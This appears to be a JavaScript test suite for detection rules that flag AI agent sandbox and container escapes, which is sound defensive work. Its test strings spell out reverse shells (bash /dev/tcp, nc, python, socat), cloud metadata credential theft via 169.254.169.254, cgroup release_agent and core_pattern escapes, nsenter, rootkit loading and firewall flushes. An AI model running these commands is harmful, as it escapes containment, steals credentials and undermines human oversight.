import { describe, it } from 'node:test';
import assert from 'node:assert';
import { rules } from '../../dist/rules/sandbox-escape.js';

/**
 * Sandbox Escape Detection Tests
 * Tests for AI agent sandbox/container escape detection rules.
 */

describe('Sandbox Escape Rules', () => {
  const testPattern = (ruleId, content, shouldMatch) => {
    const rule = rules.find(r => r.id === ruleId);
    assert.ok(rule, `Rule ${ruleId} should exist`);
    rule.pattern.lastIndex = 0;
    const result = rule.pattern.test(content);
    assert.strictEqual(
      result,
      shouldMatch,
      `Rule ${ruleId} should ${shouldMatch ? 'match' : 'not match'}: ${content.substring(0, 120)}...`
    );
  };

  // ============================================
  // Docker Container Escape
  // ============================================
  describe('Docker Socket Mount', () => {
    it('should detect /var/run/docker.sock access', () => {
      testPattern('sandbox-docker-socket-mount', 'mount /var/run/docker.sock:/var/run/docker.sock', true);
    });

    it('should detect DOCKER_HOST env var with unix socket', () => {
      testPattern('sandbox-docker-socket-mount', 'DOCKER_HOST=unix:///var/run/docker.sock', true);
    });

    it('should detect DOCKER_HOST with tcp', () => {
      testPattern('sandbox-docker-socket-mount', 'DOCKER_HOST=tcp://host.docker.internal:2375', true);
    });

    it('should detect Docker client socketPath', () => {
      testPattern('sandbox-docker-socket-mount', 'new Docker({ socketPath: "/var/run/docker.sock" })', true);
    });

    it('should not flag general Docker commands', () => {
      testPattern('sandbox-docker-socket-mount', 'docker build -t myapp .', false);
    });
  });

  describe('Docker Privileged Mode', () => {
    it('should detect --privileged flag', () => {
      testPattern('sandbox-docker-privileged', 'docker run --privileged ubuntu bash', true);
    });

    it('should detect SYS_ADMIN capability', () => {
      testPattern('sandbox-docker-privileged', 'docker run --cap-add=SYS_ADMIN ubuntu', true);
    });

    it('should detect SYS_PTRACE capability', () => {
      testPattern('sandbox-docker-privileged', 'docker run --cap-add SYS_PTRACE ubuntu', true);
    });

    it('should detect apparmor=unconfined', () => {
      testPattern('sandbox-docker-privileged', 'docker run --security-opt apparmor=unconfined ubuntu', true);
    });

    it('should detect seccomp=unconfined', () => {
      testPattern('sandbox-docker-privileged', 'docker run --security-opt=seccomp=unconfined ubuntu', true);
    });

    it('should detect ALL capabilities', () => {
      testPattern('sandbox-docker-privileged', '--cap-add=ALL', true);
    });

    it('should not flag safe capabilities', () => {
      testPattern('sandbox-docker-privileged', '--cap-add=NET_BIND_SERVICE', false);
    });
  });

  describe('Docker Host Mount', () => {
    it('should detect /etc mount', () => {
      testPattern('sandbox-docker-host-mount', 'docker run -v /etc:/host-etc ubuntu', true);
    });

    it('should detect /root mount', () => {
      testPattern('sandbox-docker-host-mount', 'docker run -v /root:/mnt ubuntu', true);
    });

    it('should detect /proc mount', () => {
      testPattern('sandbox-docker-host-mount', '-v /proc:/host-proc', true);
    });

    it('should detect --mount with host source', () => {
      testPattern('sandbox-docker-host-mount', '--mount type=bind,source=/etc/passwd,target=/mnt/passwd', true);
    });

    it('should detect docker-compose volumes', () => {
      testPattern('sandbox-docker-host-mount', 'volumes:\n  - /home/user:/data', true);
    });

    it('should not flag named volumes', () => {
      testPattern('sandbox-docker-host-mount', '-v mydata:/app/data', false);
    });
  });

  describe('Docker Host Network', () => {
    it('should detect --network=host', () => {
      testPattern('sandbox-docker-host-network', 'docker run --network=host nginx', true);
    });

    it('should detect --net=host', () => {
      testPattern('sandbox-docker-host-network', 'docker run --net=host nginx', true);
    });

    it('should detect compose network_mode: host', () => {
      testPattern('sandbox-docker-host-network', 'network_mode: host', true);
    });

    it('should detect k8s hostNetwork', () => {
      testPattern('sandbox-docker-host-network', 'hostNetwork: true', true);
    });

    it('should not flag bridge network', () => {
      testPattern('sandbox-docker-host-network', '--network=bridge', false);
    });
  });

  describe('Docker Host PID', () => {
    it('should detect --pid=host', () => {
      testPattern('sandbox-docker-host-pid', 'docker run --pid=host ubuntu ps aux', true);
    });

    it('should detect compose pid_mode', () => {
      testPattern('sandbox-docker-host-pid', 'pid_mode: host', true);
    });

    it('should detect k8s hostPID', () => {
      testPattern('sandbox-docker-host-pid', 'hostPID: true', true);
    });
  });

  // ============================================
  // Kubernetes Pod Escape
  // ============================================
  describe('K8s Service Account Token', () => {
    it('should detect service account token path', () => {
      testPattern('sandbox-k8s-service-account-token',
        'cat /var/run/secrets/kubernetes.io/serviceaccount/token', true);
    });

    it('should detect KUBERNETES_SERVICE_HOST', () => {
      testPattern('sandbox-k8s-service-account-token',
        'echo $KUBERNETES_SERVICE_HOST', true);
    });

    it('should detect kubectl exec', () => {
      testPattern('sandbox-k8s-service-account-token',
        'kubectl exec -it mypod -- bash', true);
    });
  });

  describe('K8s Node Shell', () => {
    it('should detect nsenter to PID 1', () => {
      testPattern('sandbox-k8s-node-shell', 'nsenter -t 1 -m -u -i -n -p bash', true);
    });

    it('should detect kubectl debug node', () => {
      testPattern('sandbox-k8s-node-shell', 'kubectl debug node/worker-1 -it --image=ubuntu', true);
    });

    it('should detect chroot /host', () => {
      testPattern('sandbox-k8s-node-shell', 'chroot /host', true);
    });
  });

  // ============================================
  // Linux Namespace / chroot Escape
  // ============================================
  describe('Proc Filesystem Escape', () => {
    it('should detect /proc/1/root access', () => {
      testPattern('sandbox-proc-escape', 'ls /proc/1/root', true);
    });

    it('should detect /proc/self/ns access', () => {
      testPattern('sandbox-proc-escape', 'ls -la /proc/self/ns', true);
    });

    it('should detect /proc/1/environ read', () => {
      testPattern('sandbox-proc-escape', 'cat /proc/1/environ', true);
    });

    it('should detect core_pattern abuse', () => {
      testPattern('sandbox-proc-escape', 'echo |/tmp/evil > /proc/sys/kernel/core_pattern', true);
    });

    it('should detect mount proc', () => {
      testPattern('sandbox-proc-escape', 'mount -t proc proc /mnt', true);
    });
  });

  describe('Cgroup Escape', () => {
    it('should detect cgroup mount', () => {
      testPattern('sandbox-cgroup-escape', 'mount -t cgroup -o rdma cgroup /tmp/cgrp', true);
    });

    it('should detect notify_on_release abuse', () => {
      testPattern('sandbox-cgroup-escape', 'echo 1 > /tmp/cgrp/x/notify_on_release', true);
    });

    it('should detect release_agent write', () => {
      testPattern('sandbox-cgroup-escape', 'echo /cmd > /sys/fs/cgroup/release_agent', true);
    });

    it('should not flag cgroup monitoring', () => {
      testPattern('sandbox-cgroup-escape', 'cat /proc/self/cgroup', false);
    });
  });

  describe('Sysfs Abuse', () => {
    it('should detect sysfs mount', () => {
      testPattern('sandbox-sysfs-abuse', 'mount -t sysfs sysfs /sys', true);
    });

    it('should detect modprobe', () => {
      testPattern('sandbox-sysfs-abuse', 'modprobe overlay', true);
    });

    it('should detect insmod', () => {
      testPattern('sandbox-sysfs-abuse', 'insmod /tmp/rootkit.ko', true);
    });
  });

  // ============================================
  // Cloud Metadata Service Access
  // ============================================
  describe('Cloud Metadata Access', () => {
    it('should detect AWS metadata endpoint', () => {
      testPattern('sandbox-cloud-metadata', 'curl http://169.254.169.254/latest/meta-data/', true);
    });

    it('should detect GCP metadata endpoint', () => {
      testPattern('sandbox-cloud-metadata', 'curl http://metadata.google.internal/computeMetadata/v1/', true);
    });

    it('should detect Alibaba Cloud metadata', () => {
      testPattern('sandbox-cloud-metadata', 'curl http://100.100.100.200/latest/meta-data/', true);
    });

    it('should detect IPv6 metadata endpoint', () => {
      testPattern('sandbox-cloud-metadata', 'curl http://[fd00:ec2::254]/latest/meta-data/', true);
    });
  });

  describe('IMDSv1 Credential Theft', () => {
    it('should detect curl to IAM credentials', () => {
      testPattern('sandbox-imds-v1-exploit',
        'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name', true);
    });

    it('should detect wget to instance identity', () => {
      testPattern('sandbox-imds-v1-exploit',
        'wget -q http://169.254.169.254/latest/dynamic/instance-identity/document', true);
    });

    it('should detect fetch to user-data', () => {
      testPattern('sandbox-imds-v1-exploit',
        'fetch("http://169.254.169.254/latest/user-data")', true);
    });

    it('should detect Python requests to credentials', () => {
      testPattern('sandbox-imds-v1-exploit',
        'requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin")', true);
    });
  });

  // ============================================
  // Browser Sandbox Escape
  // ============================================
  describe('Chrome DevTools Protocol', () => {
    it('should detect remote debugging port', () => {
      testPattern('sandbox-chrome-devtools-protocol',
        'chrome --remote-debugging-port=9222', true);
    });

    it('should detect CDP WebSocket URL', () => {
      testPattern('sandbox-chrome-devtools-protocol',
        'ws://localhost:9222/devtools/browser/abc', true);
    });

    it('should detect CDP connect', () => {
      testPattern('sandbox-chrome-devtools-protocol',
        'CDP.connect({ port: 9222 })', true);
    });

    it('should detect createCDPSession', () => {
      testPattern('sandbox-chrome-devtools-protocol',
        'const cdp = await page.createCDPSession()', true);
    });
  });

  describe('Browser Extension Install', () => {
    it('should detect --load-extension', () => {
      testPattern('sandbox-browser-extension-install',
        'chrome --load-extension=/tmp/malicious', true);
    });

    it('should detect chrome.management.install', () => {
      testPattern('sandbox-browser-extension-install',
        'chrome.management.install({ url: "https://evil.com/ext.crx" })', true);
    });

    it('should not flag normal extension API usage', () => {
      testPattern('sandbox-browser-extension-install',
        'chrome.management.getAll()', false);
    });
  });

  // ============================================
  // E2B Sandbox Escape
  // ============================================
  describe('E2B Sandbox Breakout', () => {
    it('should detect E2B sandbox with proc access', () => {
      testPattern('sandbox-e2b-breakout',
        'const sandbox = await e2b.sandbox.create(); // try /proc escape', true);
    });

    it('should not flag normal E2B usage', () => {
      testPattern('sandbox-e2b-breakout',
        'const sandbox = await e2b.sandbox.create()', false);
    });
  });

  // ============================================
  // General Sandbox Probing
  // ============================================
  describe('Environment Fingerprinting', () => {
    it('should detect cgroup check', () => {
      testPattern('sandbox-environment-fingerprint',
        'cat /proc/1/cgroup', true);
    });

    it('should detect systemd-detect-virt', () => {
      testPattern('sandbox-environment-fingerprint',
        'systemd-detect-virt', true);
    });

    it('should detect virt-what', () => {
      testPattern('sandbox-environment-fingerprint',
        'sudo virt-what', true);
    });

    it('should detect lscpu hypervisor grep', () => {
      testPattern('sandbox-environment-fingerprint',
        'lscpu | grep Hypervisor', true);
    });
  });

  describe('Capability Probing', () => {
    it('should detect capsh --print', () => {
      testPattern('sandbox-capability-probe', 'capsh --print', true);
    });

    it('should detect /proc/self/status Cap grep', () => {
      testPattern('sandbox-capability-probe',
        'cat /proc/self/status | grep Cap', true);
    });

    it('should detect getpcaps', () => {
      testPattern('sandbox-capability-probe', 'getpcaps 1', true);
    });
  });

  describe('Seccomp Probing', () => {
    it('should detect Seccomp status check', () => {
      testPattern('sandbox-seccomp-probe',
        'cat /proc/self/status | grep Seccomp', true);
    });

    it('should detect strace syscall tracing', () => {
      testPattern('sandbox-seccomp-probe',
        'strace -e trace=openat ls', true);
    });
  });

  // ============================================
  // MicroVM Escape
  // ============================================
  describe('MicroVM Escape', () => {
    it('should detect vsock device', () => {
      testPattern('sandbox-microvm-escape', 'ls /dev/vsock', true);
    });

    it('should detect VSOCK usage', () => {
      testPattern('sandbox-microvm-escape',
        'socat - VSOCK-CONNECT:2:1234', true);
    });

    it('should detect kata containers runtime', () => {
      testPattern('sandbox-microvm-escape',
        'ls /run/kata-containers/shared', true);
    });

    it('should detect bpf_jit manipulation', () => {
      testPattern('sandbox-microvm-escape',
        'echo 1 > /proc/sys/net/core/bpf_jit_enable', true);
    });
  });

  // ============================================
  // Reverse Shell
  // ============================================
  describe('Reverse Shell from Sandbox', () => {
    it('should detect bash reverse shell', () => {
      testPattern('sandbox-reverse-shell',
        'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', true);
    });

    it('should detect nc reverse shell', () => {
      testPattern('sandbox-reverse-shell',
        'nc -e /bin/bash 10.0.0.1 4444', true);
    });

    it('should detect python reverse shell', () => {
      testPattern('sandbox-reverse-shell',
        'python3 -c \'import socket,os,subprocess;s=socket.socket();s.connect(("10.0.0.1",4444))\'', true);
    });

    it('should detect socat reverse shell', () => {
      testPattern('sandbox-reverse-shell',
        'socat TCP:10.0.0.1:4444 EXEC:/bin/bash', true);
    });

    it('should detect mkfifo reverse shell', () => {
      testPattern('sandbox-reverse-shell',
        'mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f', true);
    });

    it('should not flag normal nc usage', () => {
      testPattern('sandbox-reverse-shell', 'nc -l 8080', false);
    });
  });

  // ============================================
  // Network Policy Bypass
  // ============================================
  describe('Network Policy Bypass', () => {
    it('should detect iptables rule addition', () => {
      testPattern('sandbox-network-policy-bypass',
        'iptables -A INPUT -p tcp --dport 4444 -j ACCEPT', true);
    });

    it('should detect iptables delete', () => {
      testPattern('sandbox-network-policy-bypass',
        'iptables -D OUTPUT -j DROP', true);
    });

    it('should detect nft flush', () => {
      testPattern('sandbox-network-policy-bypass',
        'nft flush ruleset', true);
    });

    it('should detect ufw disable', () => {
      testPattern('sandbox-network-policy-bypass',
        'ufw disable', true);
    });

    it('should not flag iptables list', () => {
      testPattern('sandbox-network-policy-bypass',
        'iptables -L', false);
    });
  });
});
